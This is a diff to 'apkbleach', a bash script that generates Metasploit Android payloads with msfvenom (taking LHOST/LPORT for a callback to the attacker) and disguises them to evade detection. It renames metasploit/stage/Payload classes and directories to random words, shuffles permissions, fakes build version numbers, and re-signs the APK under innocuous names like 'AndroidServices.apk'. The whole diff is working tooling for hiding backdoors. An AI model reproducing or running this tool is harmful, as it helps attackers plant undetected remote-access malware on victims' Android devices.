@@ -22,7 +22,7 @@ do
   sleep .1
 done
 printf "\r   ${GREEN}[-]${RESTORE} $COMP_MESSAGE"
-sleep 1 
+sleep 1;echo 
 }
 
 # Checking internet connection and installing pkgs if needed 
@@ -37,16 +37,23 @@ spinLoader;echo
 
 # Handling some input arguments
 USAGE() {     
-    echo;echo -e "${YELLOW}Usage: ${BLUE}apkbleach <path/to/file.apk>\n
-${YELLOW}Options:${BLUE}
-  -o  <path/to/outputname.apk>      Sets the name of custom output file
-  -i  <path/to/image.png>           Sets image.png as the icon of the file.apk
-  -h                                Help menu\n
-${YELLOW}Examples:${BLUE} 
-apkbleach /root/backdoor.apk
-apkbleach /root/backdoor.apk -o /root/PAYLOADS/AndroidServices.apk
-apkbleach /root/backdoor.apk -o /root/PAYLOADS/AndroidServices.apk -i /root/settings.png${RESTORE}
-";echo;exit
+    echo -e "${GREEN}Usage:${RESTORE} apkbleach ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use> ${YELLOW}-i${RESTORE}  <path/to/image.png> ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>\n
+${GREEN}Options:${RESTORE}
+  ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use>
+      
+                              Generates obfuscated payload with nops
+  ${YELLOW}-i${RESTORE}  <path/to/image.png>
+      
+                              Sets image.png as the icon of the file.apk
+  ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>
+      
+                              Sets the name of custom output file
+  ${YELLOW}-x${RESTORE}  <path/to/apk>
+      
+                              Uses pre generated metasploit payload to obfuscate  
+  ${YELLOW}-h${RESTORE}
+                              Help menu
+";exit
 }
 [[ $# -eq 0 ]] && bash $0 -h && exit
 while test $# -gt 0; do
@@ -54,20 +61,33 @@ while test $# -gt 0; do
         -h|--help)
                 USAGE
                 ;;
-        *.apk)
-                if [ -n $1 ]; then
-                    export APP_PATH=$1 
+        -x)
+                shift
+                if [ $# -gt 0 ]; then
+                    export APP_PATH=$1
                 else
                     echo -e "${RED}ERROR: ${YELLOW}Input apk not set${RESTORE}"
                     USAGE
                 fi
                 shift
                 ;;
+        -g)
+                shift
+                if [ $# -gt 0 ]; then
+                    export PAYLOAD=$1
+                    export LHOST=$2
+                    export LPORT=$3
+                else
+                    echo -e "${RED}ERROR: ${YELLOW}Input apk not set${RESTORE}"
+                    USAGE
+                fi
+                shift 3
+                ;;
         -o)
                 shift
                 if [ $# -gt 0 ]; then
                     export EXPORT_PATH=$(dirname $1)
-                    APP_NAME=$(basename $1)
+                    export OUTPUT_NAME=$(basename $1)
                 else
                     echo -e "${RED}ERROR: ${YELLOW}Output apk name not set${RESTORE}"
                     USAGE
@@ -102,19 +122,27 @@ echo '
            l__j__l__j  l__j\_l_____l_____l_____l__j__j\____l__j__j'                                                                     
 echo -e "\n${YELLOW}                        Version: ${BLUE}1.0 ${YELLOW}Author: ${BLUE}graylagx2${RESTORE}\n"
 
-[[ -z $APP_NAME ]] && APP_NAME=$(basename $APP_PATH)
+if [ ! -z $PAYLOAD ] && [ ! -z $LHOST ] && [ ! -z $LPORT ]; then
+    (msfvenom -p "$PAYLOAD" "$LHOST" "$LPORT" --pad-nops R &>/dev/null > /tmp/BleachMe.apk || $(echo -e "${RED}ERROR${RESSTORE} msfvenom failed checks options"; exit)) & 
+    PROG_MESSAGE="Generating $PAYLOAD payload"
+    COMP_MESSAGE="Generated $PAYLOAD payload"
+    spinLoader;echo
+    APP_PATH=/tmp/BleachMe.apk
+    [[ -n $EXPORT_PATH ]] && APP_NAME=$OUTPUT_NAME || APP_NAME=$(basename $APP_PATH)
+else 
+    [[ -n $APP_PATH ]] && APP_NAME=$(basename $APP_PATH) || exit
+fi
 
 # Handling user ERROR on NO-PATH
-if [ $(echo $APP_PATH | grep "/" &>/dev/null; echo $?) = 1 ]; then
-    echo -e "${BLUE}[!] ${YELLOW}You did not specify a path to original PAYLOAD please wait while we find it for you.${RESTORE}";echo
-    APP_PATH=$(find / -name "$APP_PATH" ! -path '*/root/.local/share/Trash/files/*' 2>/dev/null)
+#if [ $(echo $APP_PATH | grep "/" &>/dev/null; echo $?) = 1 ]; then
+ #   echo -e "${BLUE}[!] ${YELLOW}You did not specify a path to original PAYLOAD please wait while we find it for you.${RESTORE}";echo
+  #  APP_PATH=$(find / -name "$APP_PATH" ! -path '*/root/.local/share/Trash/files/*' 2>/dev/null)
 
-        if (( $(echo $APP_PATH | cut -d '.' -f2 | wc -w) > 1 )); then 
-            zenity --width=300 --height=200 --info --text="There are multiple PATHWAYS to your application: \n \n $APP_PATH \n \n When the file selection window opens please select the file you wish to use."
-            APP_PATH=$(zenity --title="There are multiple PATHWAYS to your application please select one" --file-selection || echo -e "ERROR: No selection")
-        fi
-        [[ $APP_PATH = "ERROR: No selection" ]] && echo -e "${RED}ERROR: ${YELLOW}No selection.${RESTORE}" && exit
-fi
+   #     if (( $(echo $APP_PATH | cut -d '.' -f2 | wc -w) > 1 )); then 
+    #        zenity --width=300 --height=200 --info --text="There are multiple PATHWAYS to your application: \n \n $APP_PATH \n \n When the file selection window opens please select the file you wish to use."
+     #       APP_PATH=$(zenity --title="There are multiple PATHWAYS to your application please select one" --file-selection || echo -e "ERROR: No selection")
+      # [[ $APP_PATH = "ERROR: No selection" ]] && echo -e "${RED}ERROR: ${YELLOW}No selection.${RESTORE}" && exit
+#i
 
 # Handling user ERROR on NOT-VALID-APK
 if [ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]; then
@@ -124,13 +152,18 @@ if [ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]; then
 fi
 
 # Variables to rename directories, files or pathways in apk
+
 M_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
 S_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
 P_SMALI_FILE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_ACTIVITY=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_SERVICE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_BROADCAST_RECEIVER=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
 MAIFEST_SCHEME=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
 
+
 # Decompile apk
-(apktool d $APP_PATH -o /tmp/apkbleach/Decompiled &>/dev/null; sleep 3) &
+(apktool -q d $APP_PATH -o /tmp/apkbleach/Decompiled; sleep 3) &
 PROG_MESSAGE="Decompiling $(basename $APP_PATH)"
 COMP_MESSAGE="Decompiled $(basename $APP_PATH)"
 spinLoader;echo
@@ -155,16 +188,20 @@ fi
 # Change app name 
 (sed -i "s/MainActivity/${APP_NAME%%.*}/g" /tmp/apkbleach/Decompiled/res/values/strings.xml;
 
-# Shuffle permissions and replace any metasploit/stage or metasploit.stage pathways and mentions.
-sed -i "2,22{N;N;s/\(.*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/};s/metasploit.stage/$M_SMALI_DIR.$S_SMALI_DIR/g;s/metasploit/$MAIFEST_SCHEME/g" /tmp/apkbleach/Decompiled/AndroidManifest.xml;
+# Shuffle permissions and replace any metasploit/stage or metasploit.stage pathways also version numbers and mentions of reciever service and activity.
+sed -i "2,22{N;N;s/\(.*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/};s/platformBuildVersionCode=\"10\"/platformBuildVersionCode=\"27\"/g;s/platformBuildVersionName=\"2.3.3\"/platformBuildVersionName=\"8.1.0\"/g;s/metasploit.stage/$M_SMALI_DIR.$S_SMALI_DIR/g;s/metasploit/$MAIFEST_SCHEME/g;s/MainActivity/$MAIN_ACTIVITY/g;s/MainService/$MAIN_SERVICE/g;s/android:name=\".MainBroadcastReceiver\"/android:name=\".$MAIN_BROADCAST_RECEIVER\"/g" /tmp/apkbleach/Decompiled/AndroidManifest.xml;
 
 # Renaming directorie-names and files-names to replace any mention of metaplsoit,stage or  Payload
 mv /tmp/apkbleach/Decompiled/smali/com/metasploit/ /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR;
 mv /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/stage /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR;
 mv /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/Payload.smali /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/$P_SMALI_FILE.smali;
+mv /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/MainActivity.smali /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/$MAIN_ACTIVITY.smali;
+mv /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/MainService.smali /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/$MAIN_SERVICE.smali;
+mv /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/MainBroadcastReceiver.smali /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/$MAIN_BROADCAST_RECEIVER.smali;
 
 # Replacing any mention of metasploit-stage-payload in all smali files
-sed -i -e "s|metasploit/stage|$M_SMALI_DIR/$S_SMALI_DIR|" /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/* -e "s|Payload|$P_SMALI_FILE|" /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/*;
+#sed -i -e "s|metasploit/stage|$M_SMALI_DIR/$S_SMALI_DIR|" /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/* -e "s|Payload|$P_SMALI_FILE|" /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/*;
+sed -i "s/metasploit/$M_SMALI_DIR/g;s/stage/$S_SMALI_DIR/g;s/MainActivity/$MAIN_ACTIVITY/g;s/MainService/$MAIN_SERVICE/g;s/MainBroadcastReceiver/$MAIN_BROADCAST_RECEIVER/g;s/Payload/$P_SMALI_FILE/g" /tmp/apkbleach/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/*;
 
 sleep 3) & 
 PROG_MESSAGE="Bleaching $(basename $APP_PATH)"
@@ -172,9 +209,10 @@ COMP_MESSAGE="Bleached $(basename $APP_PATH)"
 spinLoader;echo
 
 # Rebuild apk
-(apktool b /tmp/apkbleach/Decompiled -o /tmp/apkbleach/temp.apk &>/dev/null; sleep 3) &
-PROG_MESSAGE="Rebuilding $(basename $APP_PATH) as $APP_NAME"
-COMP_MESSAGE="Rebuilt $(basename $APP_PATH) as $APP_NAME"
+[[ -z $EXPORT_PATH ]] && DEFAULT=service.apk && APP_NAME=service.apk || DEFAULT=$OUTPUT_NAME
+(apktool -q b /tmp/apkbleach/Decompiled -o /tmp/apkbleach/temp.apk; sleep 3) &
+PROG_MESSAGE="Rebuilding $(basename $APP_PATH) as $DEFAULT"
+COMP_MESSAGE="Rebuilt $(basename $APP_PATH) as $DEFAULT"
 spinLoader;echo
  
 # Generate key,sign and align apk
@@ -186,11 +224,11 @@ COMP_MESSAGE="Generated key --> Signined --> Aligned [$APP_NAME]"
 spinLoader;echo
 
 # Move files into home directory/apkbleach/Clean and clean up
-[[ ! -z $EXPORT_PATH ]] && [[ ! -d $EXPORT_PATH ]] && mkdir -p $EXPORT_PATH
+[[ ! -z $EXPORT_PATH ]] && [[ ! -d $EXPORT_PATH ]] && mkdir -p $EXPORT_PATH 
 [[ -z $EXPORT_PATH ]] && EXPORT_PATH=$(pwd)
 
 (mv --backup=t /tmp/apkbleach/$APP_NAME /tmp/apkbleach/${APP_NAME%%.*}.keystore -t $EXPORT_PATH; 
-rm -r /tmp/apkbleach;
+rm -rf /tmp/apkbleach /tmp/BleachMe.apk;
 sleep 3) &
 PROG_MESSAGE="Moving $APP_NAME and ${APP_NAME%%.*}.keystore to $EXPORT_PATH"
 COMP_MESSAGE="Moved $APP_NAME and ${APP_NAME%%.*}.keystore to $EXPORT_PATH"
